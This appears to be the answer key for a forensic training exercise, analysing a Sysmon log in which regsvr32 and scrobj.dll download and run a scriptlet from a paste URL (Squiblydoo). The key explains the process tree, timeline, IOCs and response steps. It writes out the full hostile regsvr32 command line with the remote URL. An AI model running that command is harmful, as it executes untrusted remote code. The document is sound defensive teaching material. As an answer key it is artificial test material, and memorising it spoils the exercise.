# Case 13: Answer key (SPOILERS)

> Don't open this until your `report.md` is finished.

**Source:** EVTX-ATTACK-SAMPLES (sbousseaden), `exec_sysmon_lobin_regsvr32_sct.evtx`. A researcher recorded it on a Microsoft Windows 7 test VM (`IEWIN7`, user `IEUser`) while demonstrating the technique, so there's no real victim. Treat it as real for the exercise.

## Survey

- **Sysmon:** 3 events: 2 × Event ID 1, 1 × Event ID 3. Records **16792–16794**, consecutive, no gaps.
- Host `IEWIN7`, user `IEWIN7\IEUser`, LogonId `0x13eee`, session 1, Medium integrity, `CurrentDirectory` `C:\Users\IEUser\`.
- `UtcTime` range: **18:35:04.463 → 18:35:05.765** on 2019-05-12.
- **Record order and time order disagree.** The network event, rec 16794, is the *last* record but has the *earliest* `UtcTime`. See "The clock" below.

## Process tree

```text
cmd.exe  (no arguments)   guid …6693…AE4C0E00, PID 3528   [no process-create event]
└── regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll   PID 1420, rec 16792
    ├── [network] tcp 10.0.2.15:49165 → 104.20.208.21:80 (http)            rec 16794
    └── cmd.exe  (no arguments)                                          PID 1912, rec 16793
```

## The command line (rec 16792)

| Part | Meaning |
|---|---|
| `regsvr32.exe` | the signed Windows tool for registering COM DLLs |
| `/s` | silent: no success or failure dialog |
| `/u` | "unregister". With `/i` it makes regsvr32 call the DLL's `DllInstall` function, and nothing is actually registered |
| `/i:http://pastebin.com/raw/H4A4iDTA` | the string passed to `DllInstall`. Here it's a **URL to a raw paste** |
| `scrobj.dll` | the **Windows Script Component** runtime. Given a URL, it downloads a scriptlet (script code in XML) and **runs the script in it** |

Together: "silently download a script from this paste and run it inside a signed Microsoft binary". This trick is widely known as **Squiblydoo**. **T1218.010** (System Binary Proxy Execution: Regsvr32). Nothing about it relates to printers.

## The network connection (rec 16794)

- **Observed:** `ProcessGuid` `…E2D50F00`, the same as `regsvr32.exe` in rec 16792, so the connection is regsvr32's. TCP from `10.0.2.15:49165` to **`104.20.208.21:80`**, plain HTTP. That matches the `http://` scheme in the command line.
- **Not observed:** the host name. `DestinationHostname` is empty and there's no DNS event. The IP is in a range used by a large content-delivery network that fronted many sites, pastebin among them. The command line *says* `pastebin.com`, and the connection fits, but the log alone doesn't prove which site answered, or what was downloaded.

## The clock

| Rec | Event | `UtcTime` | System `TimeCreated` |
|---|---|---|---|
| 16792 | regsvr32 process create | 18:35:05.140 | 18:35:05.155949 |
| 16793 | child cmd.exe process create | 18:35:05.765 | 18:35:05.780949 |
| 16794 | regsvr32 network connection | **18:35:04.463** | 18:35:06.562199 |

A process can't connect before it's created. So the network event's `UtcTime` is about 0.7 s off, while its record ID and `TimeCreated` put it last. Sysmon builds network events from a separate event source, and their timestamps and delivery can be out of step with process events. The safe reading is that **the connection happened after regsvr32 started**, probably between 05.140 and the event being written at 06.562. Whether it happened before or after the child `cmd.exe` can't be pinned down. Trust the GUID link over the sub-second clock, and say so in the report.

## What happened (interpretation)

1. Someone at an **interactive Command Prompt** (parent `cmd.exe` with no arguments, session 1, Medium integrity, the user's home directory) ran the `regsvr32` command (rec 16792). That **fits Jo's account** of pasting one command into a prompt. The data can't show who was at the keyboard, or the forum post.
2. `regsvr32` reached out over HTTP (rec 16794), consistent with fetching the scriptlet from the paste URL. **T1105** (Ingress Tool Transfer) is a reasonable mapping for the download, as long as you remember the payload itself isn't in the data.
3. The scriptlet's code then started **a second `cmd.exe`** as a child of `regsvr32.exe` (rec 16793). Jo didn't type that. The downloaded code did. **T1059.003** (Windows Command Shell).
4. Jo's "nothing happened" is also consistent: `/s` hides any dialog. And the child `cmd.exe` has no arguments, so it may have been a window, a placeholder, or the start of something the export doesn't cover.
5. **The "one command" was not a printer fix.** It handed control of the PC, as Jo, to whatever was in that paste.

## Timeline (UTC, 2019-05-12)

| Time | Rec | Event |
|---|---|---|
| before 18:35:05 | — | a `cmd.exe` (PID 3528) is open in Jo's session. No event; it's the parent in rec 16792 |
| 18:35:05.140 | 16792 | `regsvr32.exe /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll` |
| after 05.140 (logged 18:35:04.463, see "The clock") | 16794 | regsvr32 → `104.20.208.21:80` |
| 18:35:05.765 | 16793 | `regsvr32.exe` starts `cmd.exe` |

## Verdict

**True positive, high confidence.** A signed Windows binary was used to download and run script code from a paste site, and that code started a command shell. There's no legitimate printer fix that works like this. Jo's account fits the data: she was most likely **socially engineered** into running it. The user isn't the threat. The paste's author is. Escalate.

## IOCs

- URL `http://pastebin.com/raw/H4A4iDTA` (record it; don't visit it)
- IP `104.20.208.21:80`: a shared content-delivery address, **low value** as a block-list entry on its own
- Command-line pattern: `regsvr32` with `/i:http` or `/i:https` and `scrobj.dll`
- The `Hashes` on `regsvr32.exe` and `cmd.exe` are **legitimate Windows binaries**. They aren't IOCs.

## What you can't conclude from this data

- What the scriptlet contained, and whether the paste is still online
- What the child `cmd.exe` (rec 16793) did next: no later events
- Exactly when the connection happened relative to the child `cmd.exe` (the clock disagreement)
- Which site actually served the content (no DNS or proxy data)
- Who typed the command, and whether the forum post exists
- Whether anything persists on the PC, or other hosts ran the same command

## Good next steps (for your recommendations)

- **Contain:** isolate `IEWIN7` now. Yes, Rhys should act tonight, remotely if he can. Treat Jo's credentials and anything she was logged in to as exposed.
- **Preserve:** full Sysmon/Security logs from 18:35 onward, proxy or firewall logs for `104.20.208.21`, and a triage image of the PC.
- **Investigate:** have someone fetch the paste safely (sandbox or a threat-intel service) to see what the scriptlet did. Look for children of the second `cmd.exe`, new files, and new autoruns.
- **Scope:** hunt every client for `regsvr32` with `/i:http` and `scrobj.dll`, and for connections from `regsvr32.exe`. Ask Jo for the forum post's address.
- **Prevent:** block outbound connections from `regsvr32.exe` at the firewall or EDR. Remind staff that "paste this into a command prompt" is a red flag, without blaming Jo.

*Score yourself with the rubric panel above the answer key in SENTINEL.*
